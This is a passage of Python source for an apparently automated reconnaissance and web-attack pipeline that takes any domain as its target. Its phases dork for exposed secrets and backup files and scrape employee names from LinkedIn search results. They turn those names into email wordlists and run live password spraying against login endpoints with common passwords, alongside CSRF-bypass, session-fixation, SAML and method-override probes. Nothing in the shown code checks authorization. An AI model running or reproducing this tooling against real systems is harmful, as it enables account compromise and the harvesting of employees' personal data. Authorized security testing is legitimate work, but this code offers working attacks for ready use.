    creation_match = re.search(r"(?i)Creation Date:\s*(.+)", whois_data)
    if creation_match:
        try:
            from dateutil import parser as _dp
            created = _dp.parse(creation_match.group(1).strip())
            age_months = (datetime.now().replace(tzinfo=created.tzinfo) - created).days / 30
            if age_months < 6:
                findings.append(f"FLAG: domain registered {age_months:.0f} months ago (< 6 months = suspicious)")
            else:
                findings.append(f"age: {age_months:.0f} months")
        except Exception:
            findings.append(f"creation_date_raw: {creation_match.group(1).strip()}")
    findings.append(f"raw_length: {len(whois_data)} bytes")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"84-WHOIS: {len(findings)} findings → {out}")
    return {"84-WHOIS": str(_out), "count": len(findings)}


async def phase_85_ASN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"85-ASN"}:
        return {}
    if only and "85-ASN" not in only:
        return {}
    _out = outdir / "asn_ranges.txt"
    if _out.exists() and not force:
        return {"85-ASN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 85-ASN: ASN/IP range enumeration")
    findings: List[str] = []
    opener = _get_urlopener()
    extra_h = _extra_headers_dict()
    resolved_file = outdir / "resolved.txt"
    ips: Set[str] = set()
    if resolved_file.exists():
        for ln in read_lines(resolved_file):
            ln = ln.strip()
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ln):
                ips.add(ln)
    if not ips:
        import socket as _sock
        try:
            ip = _sock.gethostbyname(domain)
            ips.add(ip)
        except Exception:
            pass
    if not ips:
        log("warn", "85-ASN: no IPs found for reverse ASN lookup")
        ensure(_out).write_text("[no IPs found]\n")
        return {"85-ASN": str(_out), "count": 0}
    findings.append(f"target_ips={len(ips)}")
    asns: Set[str] = set()
    cidrs: Set[str] = set()
    for ip in sorted(ips)[:50]:
        await _throttle_rate()
        try:
            url = f"https://api.bgpview.io/ip/{ip}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
            status, _, body = await _async_urlopen(opener, req, timeout=10)
            if status == 200:
                data = json.loads(body.decode("utf-8", errors="ignore"))
                for r in (data.get("data") or {}).get("prefixes") or []:
                    asn_num = r.get("asn")
                    prefix = r.get("prefix")
                    name = r.get("name", "")
                    if asn_num:
                        asns.add(str(asn_num))
                        findings.append(f"ip={ip} asn={asn_num} name={name} prefix={prefix}")
                    if prefix:
                        cidrs.add(prefix)
        except Exception:
            pass
    for asn in sorted(asns)[:10]:
        await _throttle_rate()
        try:
            url = f"https://api.bgpview.io/asn/{asn}/prefixes"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
            status, _, body = await _async_urlopen(opener, req, timeout=10)
            if status == 200:
                data = json.loads(body.decode("utf-8", errors="ignore"))
                for p in (data.get("data") or {}).get("ipv4_prefixes") or []:
                    prefix = p.get("prefix")
                    if prefix:
                        cidrs.add(prefix)
                        findings.append(f"asn={asn} ipv4_prefix={prefix}")
                for p in (data.get("data") or {}).get("ipv6_prefixes") or []:
                    prefix = p.get("prefix")
                    if prefix:
                        cidrs.add(prefix)
                        findings.append(f"asn={asn} ipv6_prefix={prefix}")
        except Exception:
            pass
    for cidr in sorted(cidrs):
        findings.append(f"cidr={cidr}")
    if not any("asn=" in f for f in findings):
        findings.append("[no ASN data found via BGPView API]")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"85-ASN: {len(findings)} findings → {out}")
    return {"85-ASN": str(_out), "count": len(findings)}


async def phase_86_DORK(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"86-DORK"}:
        return {}
    if only and "86-DORK" not in only:
        return {}
    _out = outdir / "dork_findings.txt"
    if _out.exists() and not force:
        return {"86-DORK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 86-DORK: search engine dorking")
    findings: List[str] = []
    opener = _get_urlopener()
    extra_h = _extra_headers_dict()
    dorks = [
        f"site:{domain} filetype:sql",
        f"site:{domain} inurl:admin",
        f"site:{domain} ext:env",
        f"site:{domain} ext:log",
        f"site:{domain} ext:bak",
        f'"{domain}" + password',
        f'"{domain}" + "api key"',
        f"site:{domain} intitle:\"index of\"",
        f"site:{domain} ext:xml",
        f"site:{domain} inurl:backup",
    ]
    url_re = re.compile(r'<a[^>]+href="(https?://[^"]+)"', re.I)
    for dork in dorks:
        await _throttle_rate()
        await asyncio.sleep(2)
        try:
            encoded = urllib.parse.quote_plus(dork)
            url = f"https://html.duckduckgo.com/html/?q={encoded}"
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **extra_h,
            })
            status, _, body = await _async_urlopen(opener, req, timeout=15)
            if status == 200:
                html = body.decode("utf-8", errors="ignore")
                urls = url_re.findall(html)
                for u in urls:
                    if domain in u and u not in findings:
                        findings.append(f"[{dork}] {u}")
                if urls:
                    log("info", f"86-DORK: {len(urls)} results for '{dork}'")
        except Exception:
            pass
    if not findings:
        findings.append("[no dork results found]")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"86-DORK: {len(findings)} dork findings → {out}")
    return {"86-DORK": str(_out), "count": len(findings)}


async def phase_87_SHODAN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"87-SHODAN"}:
        return {}
    if only and "87-SHODAN" not in only:
        return {}
    _out = outdir / "shodan_hosts.txt"
    if _out.exists() and not force:
        return {"87-SHODAN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 87-SHODAN: Shodan/Censys integration")
    findings: List[str] = []
    api_key = os.environ.get("SHODAN_API_KEY", "")
    if not api_key:
        log("warn", "87-SHODAN: SHODAN_API_KEY not set; skipping")
        ensure(_out).write_text("[SHODAN_API_KEY not set]\n")
        return {"87-SHODAN": str(_out), "count": 0}
    opener = _get_urlopener()
    extra_h = _extra_headers_dict()
    try:
        url = f"https://api.shodan.io/dns/domain/{domain}?type=A&key={api_key}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
        status, _, body = await _async_urlopen(opener, req, timeout=15)
        if status == 200:
            data = json.loads(body.decode("utf-8", errors="ignore"))
            for sub in (data.get("data") or []):
                hostname = sub.get("hostname", "")
                ip = sub.get("ip", "")
                if hostname or ip:
                    findings.append(f"[dns] {hostname} → {ip}")
        else:
            findings.append(f"[dns-query] HTTP {status}")
    except Exception as e:
        findings.append(f"[dns-query-error] {e}")
    try:
        url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query=hostname:{domain}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
        status, _, body = await _async_urlopen(opener, req, timeout=15)
        if status == 200:
            data = json.loads(body.decode("utf-8", errors="ignore"))
            for match in (data.get("matches") or [])[:20]:
                ip = match.get("ip_str", "")
                port = match.get("port", "")
                org = match.get("org", "")
                product = match.get("product", "")
                hostnames = match.get("hostnames", [])
                findings.append(f"[host] {ip}:{port} org={org} product={product} hosts={','.join(hostnames[:3])}")
        else:
            findings.append(f"[search-query] HTTP {status}")
    except Exception as e:
        findings.append(f"[search-query-error] {e}")
    try:
        fav_url = f"https://{domain}/favicon.ico"
        req = urllib.request.Request(fav_url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
        status, _, body = await _async_urlopen(opener, req, timeout=10)
        if status == 200 and body:
            import struct as _struct
            h = _mmh3_hash(body)
            if h == -862577723:
                findings.append(f"[favicon] Shodan favicon hash match: {h}")
            else:
                findings.append(f"[favicon] hash={h} (no known match)")
    except Exception:
        pass
    if not findings:
        findings.append("[no Shodan data found]")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"87-SHODAN: {len(findings)} findings → {out}")
    return {"87-SHODAN": str(_out), "count": len(findings)}


async def phase_88_EMPLOYEE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"88-EMPLOYEE"}:
        return {}
    if only and "88-EMPLOYEE" not in only:
        return {}
    _out = outdir / "employees.txt"
    _wl = outdir / "wordlist_generated.txt"
    if _out.exists() and _wl.exists() and not force:
        return {"88-EMPLOYEE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 88-EMPLOYEE: employee name harvesting")
    findings: List[str] = []
    opener = _get_urlopener()
    extra_h = _extra_headers_dict()
    name_re = re.compile(r'<h2[^>]*>\s*<span[^>]*>([^<]+)</span>\s*<span[^>]*>([^<]+)</span>', re.I)
    title_re = re.compile(r'at\s+' + re.escape(domain.split('.')[0]), re.I)
    employees: Set[Tuple[str, str]] = set()
    dork = f'site:linkedin.com/in "at {domain.split(".")[0]}"'
    encoded = urllib.parse.quote_plus(dork)
    try:
        url = f"https://html.duckduckgo.com/html/?q={encoded}"
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            **extra_h,
        })
        await _throttle_rate()
        status, _, body = await _async_urlopen(opener, req, timeout=15)
        if status == 200:
            html = body.decode("utf-8", errors="ignore")
            for m in name_re.finditer(html):
                first, last = m.group(1).strip(), m.group(2).strip()
                if first and last and len(first) < 30 and len(last) < 30:
                    employees.add((first.lower(), last.lower()))
    except Exception:
        pass
    for first, last in sorted(employees):
        findings.append(f"{first} {last}")
    if not findings:
        findings.append("[no employee names found via public search]")
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    wordlist: Set[str] = set()
    domain_name = domain.split(".")[0].lower()
    for first, last in employees:
        wordlist.add(f"{first}.{last}@{domain}")
        wordlist.add(f"{first[0]}{last}@{domain}")
        wordlist.add(f"{first}.{last[0]}@{domain}")
        wordlist.add(f"{first}{last}@{domain}")
        wordlist.add(f"{first}@{domain}")
    wordlist.add(f"admin@{domain}")
    wordlist.add(f"info@{domain}")
    wordlist.add(f"support@{domain}")
    wordlist.add(f"root@{domain}")
    wordlist.add(f"security@{domain}")
    ensure(_wl).write_text("\n".join(sorted(wordlist)) + ("\n" if wordlist else ""))
    log("ok", f"88-EMPLOYEE: {len(findings)} employees, {len(wordlist)} wordlist entries → {_out}")
    return {"88-EMPLOYEE": str(_out), "count": len(findings)}


async def phase_89_PASSIVEDNS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"89-PASSIVEDNS"}:
        return {}
    if only and "89-PASSIVEDNS" not in only:
        return {}
    _out = outdir / "passive_dns_subs.txt"
    if _out.exists() and not force:
        return {"89-PASSIVEDNS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 89-PASSIVEDNS: passive DNS aggregation")
    findings: Set[str] = set()
    opener = _get_urlopener()
    extra_h = _extra_headers_dict()
    vt_key = os.environ.get("VIRUSTOTAL_API_KEY", "")
    if vt_key:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains"
            req = urllib.request.Request(url, headers={"x-apikey": vt_key, "User-Agent": "Mozilla/5.0", **extra_h})
            status, _, body = await _async_urlopen(opener, req, timeout=15)
            if status == 200:
                data = json.loads(body.decode("utf-8", errors="ignore"))
                for item in (data.get("data") or []):
                    sub = item.get("id", "")
                    if sub and sub != domain:
                        findings.add(sub)
                        log("info", f"89-PASSIVEDNS: VT found {sub}")
            else:
                log("warn", f"89-PASSIVEDNS: VirusTotal HTTP {status}")
        except Exception as e:
            log("warn", f"89-PASSIVEDNS: VirusTotal error: {e}")
    else:
        log("info", "89-PASSIVEDNS: VIRUSTOTAL_API_KEY not set, skipping VirusTotal")
    st_key = os.environ.get("SECURITYTRAILS_API_KEY", "")
    if st_key:
        try:
            url = f"https://api.securitytrails.com/v1/domain/{domain}/subdomains"
            req = urllib.request.Request(url, headers={"apikey": st_key, "User-Agent": "Mozilla/5.0", **extra_h})
            status, _, body = await _async_urlopen(opener, req, timeout=15)
            if status == 200:
                data = json.loads(body.decode("utf-8", errors="ignore"))
                for sub_record in (data.get("subdomains") or []):
                    sub = f"{sub_record}.{domain}" if isinstance(sub_record, str) else ""
                    if sub:
                        findings.add(sub)
                        log("info", f"89-PASSIVEDNS: ST found {sub}")
            else:
                log("warn", f"89-PASSIVEDNS: SecurityTrails HTTP {status}")
        except Exception as e:
            log("warn", f"89-PASSIVEDNS: SecurityTrails error: {e}")
    else:
        log("info", "89-PASSIVEDNS: SECURITYTRAILS_API_KEY not set, skipping SecurityTrails")
    try:
        url = f"https://urlscan.io/api/v1/search/?q=domain:{domain}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **extra_h})
        status, _, body = await _async_urlopen(opener, req, timeout=15)
        if status == 200:
            data = json.loads(body.decode("utf-8", errors="ignore"))
            for result in (data.get("results") or [])[:50]:
                page = result.get("page", {})
                hostname = page.get("domain", "")
                if hostname and hostname != domain:
                    findings.add(hostname)
                    ip = page.get("ip", "")
                    if ip:
                        findings.add(f"{hostname} ({ip})")
            log("info", f"89-PASSIVEDNS: urlscan.io returned {len(findings)} subdomains")
        else:
            log("warn", f"89-PASSIVEDNS: urlscan.io HTTP {status}")
    except Exception as e:
        log("warn", f"89-PASSIVEDNS: urlscan.io error: {e}")
    clean_subs: List[str] = []
    for f in sorted(findings):
        sub = f.split("(")[0].strip().lower()
        if sub and _is_valid_hostname(sub) and (_is_under_domain(sub, domain) or sub == domain):
            clean_subs.append(sub)
    if clean_subs:
        all_subs = outdir / "all_subs.txt"
        if all_subs.exists():
            merge_unique([_out], all_subs)
    out = ensure(_out)
    out.write_text("\n".join(sorted(set(clean_subs))) + ("\n" if clean_subs else "[no passive DNS subdomains found]\n"))
    log("ok", f"89-PASSIVEDNS: {len(clean_subs)} subdomains → {out}")
    return {"89-PASSIVEDNS": str(_out), "count": len(clean_subs)}


async def phase_90_CSRF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"90-CSRF"}:
        return {}
    _out = outdir / "csrf_findings.txt"
    if _out.exists() and not force:
        return {"90-CSRF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 90-CSRF: CSRF token detection and bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "90-CSRF: no URLs; skipping")
        return {"90-CSRF": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    csrf_token_names = {"csrf", "token", "_token", "authenticity_token", "nonce",
                        "__requestverificationtoken", "csrfmiddlewaretoken", "xsrf"}
    form_urls = [u for u in all_urls if "=" in u or "/form" in u.lower() or "/submit" in u.lower()
                 or "/login" in u.lower() or "/register" in u.lower() or "/contact" in u.lower()]
    tested = 0
    for url in form_urls[:_PIPELINE_CFG.sample_urls_csrf]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            form_tags = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
            for form_content in form_tags:
                inputs = re.findall(r'<input[^>]+>', form_content, re.I)
                tokens_found: Dict[str, str] = {}
                for inp in inputs:
                    name_match = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                    val_match = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                    type_match = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
                    if name_match and val_match:
                        name_lower = name_match.group(1).lower()
                        if any(t in name_lower for t in csrf_token_names):
                            tokens_found[name_match.group(1)] = val_match.group(1)
                            if type_match and type_match.group(1).lower() == "hidden":
                                findings.append(f"[csrf-token-present] {url} — hidden field: {name_match.group(1)}")
                if tokens_found:
                    for field_name, field_val in tokens_found.items():
                        test_url = url
                        parsed_url = urllib.parse.urlparse(test_url)
                        qs = urllib.parse.parse_qs(parsed_url.query)
                        qs[field_name] = [""]
                        new_query = urllib.parse.urlencode(qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                        await _throttle_rate()
                        try:
                            req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                            if s2 in (200, 302):
                                findings.append(f"[csrf-bypass] {url} — empty {field_name} accepted (HTTP {s2})")
                        except Exception:
                            pass
                else:
                    post_forms = [f for f in form_tags if 'method="post"' in f.lower() or "method='post'" in f.lower()]
                    if post_forms:
                        findings.append(f"[csrf-missing] {url} — POST form without CSRF token")
            if "?" in url and any(t in url.lower() for t in csrf_token_names):
                findings.append(f"[csrf-in-url] {url} — CSRF token in GET parameter")
            tested += 1
        except Exception:
            continue
    if not findings:
        findings.append(f"[csrf] {tested} URLs tested, no CSRF issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"90-CSRF: {len(findings)} findings → {out}")
    return {"90-CSRF": str(_out), "count": len(findings)}


async def phase_91_SESSIONFIX(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"91-SESSIONFIX"}:
        return {}
    _out = outdir / "session_fixation.txt"
    if _out.exists() and not force:
        return {"91-SESSIONFIX": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 91-SESSIONFIX: session fixation testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "91-SESSIONFIX: no URLs; skipping")
        return {"91-SESSIONFIX": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    login_urls = [u for u in all_urls if any(m in u.lower() for m in
                  ("/login", "/signin", "/auth", "/session", "/account/signin"))]
    if not login_urls:
        login_urls = [u for u in all_urls if "/api/" in u.lower()][:5]
    for url in login_urls[:_PIPELINE_CFG.sample_hosts_sessionfix]:
        await _throttle_rate()
        try:
            import http.cookiejar
            cj = http.cookiejar.CookieJar()
            opener_cj = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            opener_cj.open(req, timeout=10)
            pre_cookies = {c.name: c.value for c in cj}
            if not pre_cookies:
                findings.append(f"[no-session-pre] {url} — no session cookie before auth")
                continue
            parsed = urllib.parse.urlparse(url)
            post_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            post_data = urllib.parse.urlencode({"username": "test", "password": "test"}).encode()
            req2 = urllib.request.Request(post_url, data=post_data,
                                         headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", **_extra_h})
            try:
                opener_cj.open(req2, timeout=10)
            except Exception:
                pass
            post_cookies = {c.name: c.value for c in cj}
            if pre_cookies == post_cookies and pre_cookies:
                findings.append(f"[session-fixation] {url} — session cookie unchanged after auth attempt")
            elif pre_cookies and post_cookies:
                changed = [k for k in pre_cookies if k in post_cookies and pre_cookies[k] != post_cookies[k]]
                if changed:
                    findings.append(f"[session-rotated] {url} — cookie(s) rotated: {', '.join(changed)}")
        except Exception:
            continue
    if not findings:
        findings.append("[session-fixation] No login endpoints tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"91-SESSIONFIX: {len(findings)} findings → {out}")
    return {"91-SESSIONFIX": str(_out), "count": len(findings)}


async def phase_92_SAML(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"92-SAML"}:
        return {}
    _out = outdir / "saml_findings.txt"
    if _out.exists() and not force:
        return {"92-SAML": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 92-SAML: SAML misconfiguration attacks")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "92-SAML: no URLs; skipping")
        return {"92-SAML": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    saml_paths = ["/saml/acs", "/saml/sso", "/saml/login", "/saml/metadata",
                  "/adfs/ls/", "/simplesaml", "/saml2/acs", "/idp/sso",
                  "/saml/slo", "/oauth2/saml"]
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    saml_endpoints: List[str] = []
    for base in hosts:
        for path in saml_paths:
            saml_endpoints.append(f"{base}{path}")
    for ep in saml_endpoints[:_PIPELINE_CFG.sample_endpoints_saml]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(ep, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if status in (200, 302, 405):
                findings.append(f"[saml-endpoint] {ep} — accessible (HTTP {status})")
                if "saml" in body.lower() or "samlresponse" in body.lower():
                    findings.append(f"  → SAML response form detected")
            if status == 200 and "xml" in body.lower()[:100]:
                if "<Signature" not in body and "<samlp:Response" in body:
                    findings.append(f"[saml-no-signature] {ep} — SAML metadata without signature")
        except Exception:
            continue
    if not findings:
        findings.append("[saml] No SAML endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"92-SAML: {len(findings)} findings → {out}")
    return {"92-SAML": str(_out), "count": len(findings)}


async def phase_93_PWDSPRAY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"93-PWDSPRAY"}:
        return {}
    _out = outdir / "password_spray_results.txt"
    if _out.exists() and not force:
        return {"93-PWDSPRAY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 93-PWDSPRAY: password spraying")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "93-PWDSPRAY: no URLs; skipping")
        return {"93-PWDSPRAY": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    common_passwords = ["Password1!", "Welcome1!", "admin123", "password1",
                        "Company2024!", "Test1234!", "welcome1", "changeme",
                        "P@ssw0rd!", "Summer2024!", "Winter2024!", "Letmein1!"]
    usernames = ["admin", "test", "support", "user", "guest"]
    emp_file = outdir / "employees.txt"
    if emp_file.exists():
        for ln in read_lines(emp_file):
            parts = ln.strip().split()
            if len(parts) >= 2:
                usernames.append(f"{parts[0]}.{parts[1]}")
    login_urls = [u for u in all_urls if any(m in u.lower() for m in
                  ("/login", "/signin", "/auth", "/api/login", "/wp-login"))]
    if not login_urls:
        log("warn", "93-PWDSPRAY: no login endpoints found")
        ensure(_out).write_text("[no login endpoints found]\n")
        return {"93-PWDSPRAY": str(_out), "count": 0}
    for url in login_urls[:3]:
        for user in usernames[:_PIPELINE_CFG.sample_users_spray]:
            for pwd in common_passwords[:5]:
                await _throttle_rate()
                try:
                    parsed = urllib.parse.urlparse(url)
                    post_data = urllib.parse.urlencode({"username": user, "password": pwd,
                                                        "user": user, "pass": pwd}).encode()
                    req = urllib.request.Request(url, data=post_data,
                                                 headers={"User-Agent": "Mozilla/5.0",
                                                          "Content-Type": "application/x-www-form-urlencoded",
                                                          **_extra_h})
                    status, resp_h, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if status in (200, 302) and ("dashboard" in body or "welcome" in body or "logout" in body):
                        findings.append(f"[weak-cred] {url} — user={user} pass={pwd} (HTTP {status})")
                    elif "locked" in body or "too many" in body or "rate limit" in body:
                        findings.append(f"[lockout-detected] {url} — account lockout after spray attempt")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[password-spray] No weak credentials found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"93-PWDSPRAY: {len(findings)} findings → {out}")
    return {"93-PWDSPRAY": str(_out), "count": len(findings)}


async def phase_94_COOKIEAUDIT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"94-COOKIEAUDIT"}:
        return {}
    _out = outdir / "cookie_audit.txt"
    if _out.exists() and not force:
        return {"94-COOKIEAUDIT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 94-COOKIEAUDIT: cookie security deep audit")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "94-COOKIEAUDIT: no URLs; skipping")
        return {"94-COOKIEAUDIT": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            base = f"{parsed.scheme}://{parsed.netloc}"
            hosts.add(base)
    for base in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_cookie]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(base, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, headers, _ = await _async_urlopen(_urlopen, req, timeout=10)
            set_cookie_headers = headers.get_all("Set-Cookie") if hasattr(headers, "get_all") else []
            if not set_cookie_headers:
                set_cookie_vals = []
                for h in str(headers).split("\n"):
                    if h.lower().startswith("set-cookie:"):
                        set_cookie_vals.append(h.split(":", 1)[1].strip())
                set_cookie_headers = set_cookie_vals
            for sc in set_cookie_headers:
                cookie_name = sc.split("=")[0].strip() if "=" in sc else "unknown"
                sc_lower = sc.lower()
                issues: List[str] = []
                if "httponly" not in sc_lower:
                    issues.append("missing HttpOnly")
                if "secure" not in sc_lower:
                    issues.append("missing Secure")
                if "samesite" not in sc_lower:
                    issues.append("missing SameSite")
                if "path=" not in sc_lower:
                    issues.append("no Path set")
                if "max-age" not in sc_lower and "expires" not in sc_lower:
                    issues.append("no expiration")
                if cookie_name.startswith("__host-") or cookie_name.startswith("__secure-"):
                    findings.append(f"[cookie-prefix-ok] {base} — {cookie_name} uses __Host/__Secure prefix")
                if issues:
                    findings.append(f"[cookie-weak] {base} — {cookie_name}: {', '.join(issues)}")
        except Exception:
            continue
    if not findings:
        findings.append("[cookie-audit] No cookie security issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"94-COOKIEAUDIT: {len(findings)} findings → {out}")
    return {"94-COOKIEAUDIT": str(_out), "count": len(findings)}


async def phase_95_POSTTEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"95-POSTTEST"}:
        return {}
    _out = outdir / "post_findings.txt"
    if _out.exists() and not force:
        return {"95-POSTTEST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 95-POSTTEST: POST method endpoint testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "95-POSTTEST: no URLs; skipping")
        return {"95-POSTTEST": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_posttest]:
        await _throttle_rate()
        try:
            req_get = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s_get, _, b_get = await _async_urlopen(_urlopen, req_get, timeout=10)
            len_get = len(b_get)
        except Exception:
            continue
        payloads = [
            ("", "text/plain"),
            ("{}", "application/json"),
            ("data=test", "application/x-www-form-urlencoded"),
        ]
        for body_data, ct in payloads:
            await _throttle_rate()
            try:
                req_post = urllib.request.Request(url, data=body_data.encode(),
                                                  method="POST",
                                                  headers={"User-Agent": "Mozilla/5.0",
                                                           "Content-Type": ct, **_extra_h})
                s_post, _, b_post = await _async_urlopen(_urlopen, req_post, timeout=10)
                len_post = len(b_post)
                if s_post != s_get and s_post not in (404, 405):
                    findings.append(f"[post-diff-status] {url} — GET={s_get} POST={s_post} (Content-Type: {ct})")
                elif abs(len_post - len_get) > 100 and s_post == 200:
                    findings.append(f"[post-diff-length] {url} — GET={len_get}b POST={len_post}b (Content-Type: {ct})")
                tested += 1
            except Exception:
                continue
    if not findings:
        findings.append(f"[post-test] {tested} POST tests completed, no hidden functionality found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"95-POSTTEST: {len(findings)} findings → {out}")
    return {"95-POSTTEST": str(_out), "count": len(findings)}


async def phase_96_METHODOVERRIDE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"96-METHODOVERRIDE"}:
        return {}
    _out = outdir / "method_override_bypass.txt"
    if _out.exists() and not force:
        return {"96-METHODOVERRIDE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 96-METHODOVERRIDE: HTTP method override bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "96-METHODOVERRIDE: no URLs; skipping")
        return {"96-METHODOVERRIDE": str(_out), "count": 0}
    findings: List[str] = []
